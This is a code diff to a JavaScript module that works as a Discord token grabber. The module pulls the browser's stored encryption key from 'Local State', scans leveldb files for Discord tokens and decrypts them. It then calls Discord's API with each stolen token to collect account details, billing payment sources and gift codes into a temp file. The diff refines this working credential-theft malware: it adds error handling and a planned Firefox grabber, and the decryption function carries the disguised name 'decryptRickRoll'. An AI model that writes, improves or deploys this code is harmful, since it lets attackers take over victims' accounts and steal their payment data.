@@ -41,12 +41,15 @@ const decryptToken = (token, key) => execSync([
 ].join(' ')).toString();
 
 const decryptRickRoll = (path) => {
-  return new Promise(resolve => {
+  return new Promise((resolve, reject) => {
     const encryptedTokens = [];
     const localStatePath = join(path, 'Local State');
     const key = JSON.parse(readFileSync(localStatePath).toString())['os_crypt']['encrypted_key'];
     const levelDB = path.includes('cord') ? join(path, 'Local Storage', 'leveldb') : join(path, 'Default', 'Local Storage', 'leveldb');
-    if (!existsSync(levelDB)) return;
+    if (!existsSync(levelDB)) {
+      reject();
+      return;
+    }
     readdirSync(levelDB).map(f => {
       if (f.split('.').pop() !== 'log' && f.split('.').pop() !== 'ldb') return;
       const readInterface = readline.createInterface({
@@ -63,7 +66,11 @@ const decryptRickRoll = (path) => {
           token = decryptToken(token, key);
           if (!!token && !tokens.includes(token)) tokens.push(token);
         });
-        resolve(tokens);
+        if (tokens.length > 0) {
+          resolve(tokens);
+        } else {
+          reject();
+        }
       });
     });
   });
@@ -73,62 +80,64 @@ module.exports = new Promise((resolve) => {
   Object.keys(paths).forEach(path => {
     if (!existsSync(paths[path])) return;
     else if (path.includes('Firefox')) {
-
+      // TODO: do Firefox grabber
     } else {
-      decryptRickRoll(paths[path]).then(tokens => {
-        const jsonFile = join(tempFolder, 'dsc_acc.json');
-        writeFileSync(jsonFile, '{}');
-        tokens.map(token => {
-          token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
-          axios.get('https://discord.com/api/v10/users/@me', {
-            headers: { Authorization: token, 'User-Agent': userAgent }
-          })
-            .then(res => {
-              if (res.status !== 200) return;
-              let json = res.data;
-              json.token = token;
-              let info = statSync(jsonFile) ? require(jsonFile) : {};
-              if (!info.accounts) info.accounts = [];
-              if (!info.accounts.find(account => account.token === token)) {
-                info.accounts.push(json);
-                writeFileSync(jsonFile, JSON.stringify(info));
-              }
-
-              axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
-                headers: { Authorization: token, 'User-Agent': userAgent }
-              })
-                .then(res => {
-                  if (res.status !== 200) return;
-                  const json = res.data;
-                  let info = require(jsonFile);
-                  if (!info.billing) info.billing = [];
-                  json.forEach(billing => {
-                    if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
-                  });
-                  writeFileSync(jsonFile, JSON.stringify(info));
-
-                  axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
-                    headers: { Authorization: token, 'User-Agent': userAgent }
-                  })
-                    .then(res => {
-                      if (res.status !== 200) return;
-                      const json = res.data;
-                      let info = require(jsonFile);
-                      if (!info.gifts) info.gifts = [];
-                      json.forEach(gift => {
-                        if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
-                      });
-                      writeFileSync(jsonFile, JSON.stringify(info));
-
-                      resolve();
-                    })
-                    .catch(() => {});
-                })
-                .catch(() => {});
+      decryptRickRoll(paths[path])
+        .then(tokens => {
+          const jsonFile = join(tempFolder, 'dsc_acc.json');
+          writeFileSync(jsonFile, '{}');
+          tokens.map(token => {
+            token = token?.toString()?.replaceAll(/[\n\r\t]/gi, '');
+            axios.get('https://discord.com/api/v10/users/@me', {
+              headers: { Authorization: token, 'User-Agent': userAgent }
             })
-            .catch(() => {});
-        });
-      });
+              .then(res => {
+                if (res.status !== 200) return;
+                let json = res.data;
+                json.token = token;
+                let info = statSync(jsonFile) ? require(jsonFile) : {};
+                if (!info.accounts) info.accounts = [];
+                if (!info.accounts.find(account => account.token === token)) {
+                  info.accounts.push(json);
+                  writeFileSync(jsonFile, JSON.stringify(info));
+                }
+
+                axios.get('https://discord.com/api/v10/users/@me/billing/payment-sources', {
+                  headers: { Authorization: token, 'User-Agent': userAgent }
+                })
+                  .then(res => {
+                    if (res.status !== 200) return;
+                    const json = res.data;
+                    let info = require(jsonFile);
+                    if (!info.billing) info.billing = [];
+                    json.forEach(billing => {
+                      if (!info.billing.find(b => b.id === billing.id)) info.billing.push(billing);
+                    });
+                    writeFileSync(jsonFile, JSON.stringify(info));
+
+                    axios.get('https://discord.com/api/v10/users/@me/outbound-promotions/codes', {
+                      headers: { Authorization: token, 'User-Agent': userAgent }
+                    })
+                      .then(res => {
+                        if (res.status !== 200) return;
+                        const json = res.data;
+                        let info = require(jsonFile);
+                        if (!info.gifts) info.gifts = [];
+                        json.forEach(gift => {
+                          if (!info.gifts.find(g => g.id === gift.id)) info.gifts.push(gift);
+                        });
+                        writeFileSync(jsonFile, JSON.stringify(info));
+
+                        resolve();
+                      })
+                      .catch(() => {});
+                  })
+                  .catch(() => {});
+              })
+              .catch(() => {});
+          });
+        })
+        .catch(resolve);
     }
   });
 });
